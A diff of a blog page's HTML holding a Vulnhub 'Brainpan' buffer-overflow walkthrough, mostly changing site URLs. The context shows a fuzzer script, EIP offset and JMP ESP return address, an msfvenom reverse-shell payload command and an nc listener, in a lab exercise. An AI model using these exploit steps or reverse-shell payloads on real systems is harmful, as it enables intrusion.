@@ -20,14 +20,14 @@ Output:
 nmap -sC -sV -oG nmap/service_enum.txt -v 192."/>
 <meta name="keywords" content="Vulnhub, Linux, Buffer Overflow, Walkthrough, Writeup"/>
 <meta name="robots" content="noodp"/>
-<link rel="canonical" href="https://fpkmatthi.xyz/posts/brainpan/" />
+<link rel="canonical" href="https://me.fpkmatthi.xyz/posts/brainpan/" />
 
 
 
 
-<link rel="stylesheet" href="https://fpkmatthi.xyz/assets/style.css">
+<link rel="stylesheet" href="https://me.fpkmatthi.xyz/assets/style.css">
 
-  <link rel="stylesheet" href="https://fpkmatthi.xyz/assets/blue.css">
+  <link rel="stylesheet" href="https://me.fpkmatthi.xyz/assets/blue.css">
 
 
 
@@ -35,9 +35,9 @@ nmap -sC -sV -oG nmap/service_enum.txt -v 192."/>
 
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://fpkmatthi.xyz/img/apple-touch-icon-144-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://me.fpkmatthi.xyz/img/apple-touch-icon-144-precomposed.png">
 
-<link rel="shortcut icon" href="https://fpkmatthi.xyz/img/favicon/blue.png">
+<link rel="shortcut icon" href="https://me.fpkmatthi.xyz/img/favicon/blue.png">
 
 
 
@@ -48,9 +48,9 @@ nmap -sn -oG nmap/host_discovery.txt 192.168.56.0/24
 Output:
 &amp;lt;snippet&amp;gt; Nmap scan report for 192.168.56.104 Host is up (0.00082s latency). Service enum Now we can launch a targeted port scan
 nmap -sC -sV -oG nmap/service_enum.txt -v 192." />
-<meta name="twitter:site" content="https://fpkmatthi.xyz" />
+<meta name="twitter:site" content="https://me.fpkmatthi.xyz" />
 <meta name="twitter:creator" content="Matthias Van De Velde" />
-<meta name="twitter:image" content="https://fpkmatthi.xyz/img/brainpan.png">
+<meta name="twitter:image" content="https://me.fpkmatthi.xyz/img/brainpan.png">
 
 
 <meta property="og:locale" content="en" />
@@ -61,9 +61,9 @@ nmap -sn -oG nmap/host_discovery.txt 192.168.56.0/24
 Output:
 &amp;lt;snippet&amp;gt; Nmap scan report for 192.168.56.104 Host is up (0.00082s latency). Service enum Now we can launch a targeted port scan
 nmap -sC -sV -oG nmap/service_enum.txt -v 192." />
-<meta property="og:url" content="https://fpkmatthi.xyz/posts/brainpan/" />
+<meta property="og:url" content="https://me.fpkmatthi.xyz/posts/brainpan/" />
 <meta property="og:site_name" content="Vulnhub - Brainpan" />
-<meta property="og:image" content="https://fpkmatthi.xyz/img/brainpan.png">
+<meta property="og:image" content="https://me.fpkmatthi.xyz/img/brainpan.png">
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
 
@@ -146,7 +146,7 @@ nmap -sC -sV -oG nmap/service_enum.txt -v 192." />
     
 <div class="post">
   <h1 class="post-title">
-    <a href="https://fpkmatthi.xyz/posts/brainpan/">Vulnhub - Brainpan</a></h1>
+    <a href="https://me.fpkmatthi.xyz/posts/brainpan/">Vulnhub - Brainpan</a></h1>
   <div class="post-meta">
       
     <span class="post-date">
@@ -164,19 +164,19 @@ nmap -sC -sV -oG nmap/service_enum.txt -v 192." />
   
   <span class="post-tags">
     
-    #<a href="https://fpkmatthi.xyz/tags/vulnhub/">Vulnhub</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/vulnhub/">Vulnhub</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/linux/">Linux</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/linux/">Linux</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/buffer-overflow/">Buffer Overflow</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/buffer-overflow/">Buffer Overflow</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/x86/">x86</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/x86/">x86</a>&nbsp;
     
   </span>
   
 
   
-  <img src="https://fpkmatthi.xyz/img/brainpan.png" class="post-cover" />
+  <img src="https://me.fpkmatthi.xyz/img/brainpan.png" class="post-cover" />
   
 
   <div class="post-content"><div>
@@ -235,9 +235,9 @@ When we look at the source (ctrl+u) there&rsquo;s nothing really useful.</p>
 <span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>sys
 <span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
 
-ip<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.56.10&#34;</span>
+ip<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">192.168.56.10</span><span style="color:#e6db74">&#34;</span>
 port<span style="color:#f92672">=</span><span style="color:#ae81ff">9999</span>
-buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
 
 <span style="color:#66d9ef">while</span> True:
   <span style="color:#66d9ef">try</span>:
@@ -246,21 +246,21 @@ buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span>
     s<span style="color:#f92672">.</span>send((buffer))
     s<span style="color:#f92672">.</span>close()
     sleep(<span style="color:#ae81ff">1</span>)
-    buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>
+    buffer <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>
   <span style="color:#66d9ef">except</span>:
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Error at {} bytes&#34;</span><span style="color:#f92672">.</span>format(str(len(buffer))))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Error at {} bytes</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(str(len(buffer))))
     sys<span style="color:#f92672">.</span>exit()
 </code></pre></div><p>When we run <code>fuzzer.py</code>, we can see the script crashed the program at sending 700 bytes.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">Error at <span style="color:#ae81ff">700</span> bytes
 </code></pre></div><p>To find the exact offset where the program crashes, we&rsquo;ll use a tool that&rsquo;s included in Metasploit Framework (pattern_create.rb). As length, we will use the same as the amount of bytes that our Python script sent, to crash the program.</p>
 <p><code>/opt/metasploit-framework/tools/exploit/pattern_create.rb -l 700</code></p>
 <p>We don&rsquo;t have to use the while loop anymore and we will change the buffer we send, to include the pattern we just created.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;pattern&gt;&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;pattern&gt;</span><span style="color:#e6db74">&#34;</span>
 </code></pre></div><p>We note the EIP value in Immunity Debugger and use it as input in another Metasploit Framework tool (pattern_offset.rb)</p>
 <p><img src="/img/eip_value_debugger.png" alt="EIP value Immunity Debugger"></p>
 <p><img src="/img/pattern_offset_result.png" alt="pattern_offset.rb result"></p>
 <p>The goal here is to control the EIP, so we can control the execution flow of the program. We can further adapt our script with the exact offset:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
 </code></pre></div><p>The EIP now contains <em>42424242</em>, where <em>42</em> is the Hex code for <em>B</em>. This means we have control of the execution flow of the program.</p>
 <p>Before we write any exploit code, we need to verify any bad characters.
 We can do it manually or use <code>mona.py</code> to automate the process. (<a href="https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/">Tutorial</a>)</p>
@@ -272,7 +272,7 @@ We can do it manually or use <code>mona.py</code> to automate the process. (<a h
 <p><img src="/img/mona_module_return_address.png" alt="Mona module return address"></p>
 <p><strong>Note:</strong> \xff\xe4 (FFE4) is the equivalent of a <code>JMP ESP</code> in Assembly</p>
 <p>We&rsquo;ll adapt the script to use the return address of the ESP jump:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3</span><span style="color:#ae81ff">\x12</span><span style="color:#ae81ff">\x17</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#34;</span>
 </code></pre></div><p><strong>Note:</strong> Pay attention to the order of the bytes. Since we are dealing with x86 architecture, the low order byte is stored at the lowest address and the high order byte is stored at the highest address.</p>
 <p>To verify if the return address gives us control over the ESP, we can set a breakpoint (<em>F2</em>) at the return address in Immunity Debugger:</p>
 <p><img src="/img/debugger_set_breakpoint.png" alt="Immunity Debugger set breakpoint"></p>
@@ -282,8 +282,8 @@ We can do it manually or use <code>mona.py</code> to automate the process. (<a h
 <p>Lastly, we need to craft the exploit. This is where the bad chars come into play.</p>
 <p><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;</code></p>
 <p>For the last time, we need to edit our script and paste the output of msfvenom:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;msfvenom output&gt;&#34;</span>
-buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>payload
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;msfvenom output&gt;</span><span style="color:#e6db74">&#34;</span>
+buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3</span><span style="color:#ae81ff">\x12</span><span style="color:#ae81ff">\x17</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>payload
 </code></pre></div><p><strong>Note:</strong> \x90 is used as padding to make sure the payload is executed.</p>
 <p>To test the payload, we&rsquo;ll run <em>brainpan.exe</em> without attaching it to Immunity Debugger and listen for incoming connections with <code>nc -lvnp 4444</code>:</p>
 <p><img src="/img/exploit_payload.png" alt="Exploit payload"></p>
@@ -324,7 +324,7 @@ export TERM<span style="color:#f92672">=</span>xterm
     <div class="pagination__buttons">
       
       <span class="button previous">
-        <a href="https://fpkmatthi.xyz/posts/x86winbofnetw/">
+        <a href="https://me.fpkmatthi.xyz/posts/x86winbofnetw/">
           <span class="button__icon">←</span>
           <span class="button__text">x86 Windows Remote Buffer Overflow Cheatsheet</span>
         </a>
@@ -332,7 +332,7 @@ export TERM<span style="color:#f92672">=</span>xterm
       
       
       <span class="button next">
-        <a href="https://fpkmatthi.xyz/posts/i3talent/">
+        <a href="https://me.fpkmatthi.xyz/posts/i3talent/">
           <span class="button__text">i3Talent</span>
           <span class="button__icon">→</span>
         </a>
@@ -360,8 +360,8 @@ export TERM<span style="color:#f92672">=</span>xterm
   </div>
 </footer>
 
-<script src="https://fpkmatthi.xyz/assets/main.js"></script>
-<script src="https://fpkmatthi.xyz/assets/prism.js"></script>
+<script src="https://me.fpkmatthi.xyz/assets/main.js"></script>
+<script src="https://me.fpkmatthi.xyz/assets/prism.js"></script>
 
 
 
